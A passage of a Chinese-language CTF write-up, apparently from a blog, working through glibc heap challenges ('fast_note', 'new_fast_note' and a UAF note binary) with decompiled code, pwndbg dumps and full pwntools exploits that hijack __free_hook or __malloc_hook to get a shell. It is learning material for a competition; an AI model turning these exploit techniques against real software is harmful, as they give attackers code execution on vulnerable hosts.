class="built_in">free</span>(notes[v2]);<span class="comment">// uaf漏洞</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>edit：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">edit_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, notes[v2], note_size[v2]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>show：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">show_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">      <span class="built_in">puts</span>(notes[v2]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>申请9个<code>unsortedbin</code>大小的堆，释放前8个，其中7个进入<code>tcachebin</code>，1个进入<code>unsortedbin</code>，第9个堆用于避免被<code>topchunk</code>吸收。</li><li>打印得到<code>libc</code>地址，计算<code>__free_hook</code>和<code>system</code>。</li><li>修改第6个堆的<code>fd</code>指针指向<code>__free_hook</code>。</li><li>再申请2个堆，劫持<code>__free_hook</code>为<code>system</code>。</li><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">31047</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">112</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(system))</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h3><p><code>libc2.23</code>下的<code>uaf</code>漏洞，无<code>edit</code>功能，其他功能和上述一样，因此可以构造<code>double free</code>。</p><ul><li>申请两个堆，第一个有<code>unsortedbin</code>大小，释放第一个，泄露<code>libc</code>。</li><li>再申请两个数据大小为<code>0x60</code>的堆，释放其中第一个，再释放第二个，再释放第一个，绕过检查，达成<code>double free</code>。</li><li>再申请一个数据大小为<code>0x60</code>的堆，并修改其<code>fd</code>指向<code>__malloc_hook-0x23</code>处。</li><li>将<code>__malloc_hook-0x23</code>处的堆块申请过来，修改<code>__malloc_hook</code>为<code>one_gadget</code>，必要时用<code>realloc</code>进行调整。</li><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">30160</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">104</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log,success(<span class="string">&quot;libc_base==&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">gadgets=[<span class="number">0x4527a</span>,<span class="number">0x45226</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=libc_base+gadgets[<span class="number">3</span>]</span><br><span class="line">realloc=libc_base+libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">0x6</span>))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="new-fast-note"><a href="#new-fast-note" class="headerlink" title="new_fast_note"></a>new_fast_note</h3><p><code>libc2.31</code>下的<code>uaf</code>漏洞，无<code>edit</code>功能，其他功能和上述一样。由于引入了<code>tcache</code>，这里学习了一种新的<code>double free</code>利用手法<code>house of botcake</code>。<a href="https://www.cnblogs.com/brain-Z/p/16853137.html">参考文章</a></p><ul><li>分配9个<code>unsortedbin</code> 大小的堆块，释放掉前7个，再申请一个保护堆块防止合并。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> —▸ <span class="number">0x563c55bf6570</span> —▸ <span class="number">0x563c55bf64e0</span> —▸ <span class="number">0x563c55bf6450</span> —▸ <span class="number">0x563c55bf63c0</span> —▸ <span class="number">0x563c55bf6330</span> —▸ <span class="number">0x563c55bf62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><ul><li>释放掉第9个堆块。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> —▸ <span class="number">0x563c55bf6570</span> —▸ <span class="number">0x563c55bf64e0</span> —▸ <span class="number">0x563c55bf6450</span> —▸ <span class="number">0x563c55bf63c0</span> —▸ <span class="number">0x563c55bf6330</span> —▸ <span class="number">0x563c55bf62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6710</span> —▸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x563c55bf6710</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><ul><li>释放掉第8个堆块，触发<code>unsortedbin consolidate</code>合并为一个大堆块。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> —▸ <span class="number">0x563c55bf6570</span> —▸ <span class="number">0x563c55bf64e0</span> —▸ <span class="number">0x563c55bf6450</span> —▸ <span class="number">0x563c55bf63c0</span> —▸ <span class="number">0x563c55bf6330</span> —▸ <span class="number">0x563c55bf62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6680</span> —▸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x563c55bf6680</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0x563c55bf6680</span></span><br><span class="line"><span class="number">0x563c55bf6680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000121</span></span><br><span class="line"><span class="number">0x563c55bf6690</span>:<span class="number">0x00007fe8d8e26be0</span><span class="number">0x00007fe8d8e26be0</span></span><br><span class="line"><span class="number">0x563c55bf66a0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66b0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66c0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66d0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66e0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66f0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6700</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6710</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x563c55bf6720</span>:<span class="number">0x00007fe8d8e26be0</span><span class="number">0x00007fe8d8e26be0</span></span><br><span class="line"><span class="number">0x563c55bf6730</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6740</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6750</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6760</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure><ul><li>申请一个堆块(Tcache优先)，再释放掉第9个堆块，此时两个指针分别位于<code>unsortedbin</code>中和<code>tcache</code>中，完成了<code>double free</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6720</span> —▸ <span class="number">0x563c55bf6570</span> —▸ <span class="number">0x563c55bf64e0</span> —▸ <span class="number">0x563c55bf6450</span> —▸ <span class="number">0x563c55bf63c0</span> —▸ <span class="number">0x563c55bf6330</span> —▸ <span class="number">0x563c55bf62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6680</span> —▸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x563c55bf6680</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><ul><li>只需申请一个比第9个堆块大的堆块，便能切割<code>unsortedbin</code>，在第9个堆块处的<code>fd</code>指针留下<code>__free_hook</code>即可。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6720</span> —▸ <span class="number">0x7fe8d8e28e48</span> (__free_hook) ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6730</span> —▸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x563c55bf6730</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><ul><li>申请到<code>__free_hook</code>为<code>system</code>，释放数据为<code>/bin/sh</code>的堆块即可。</li><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span 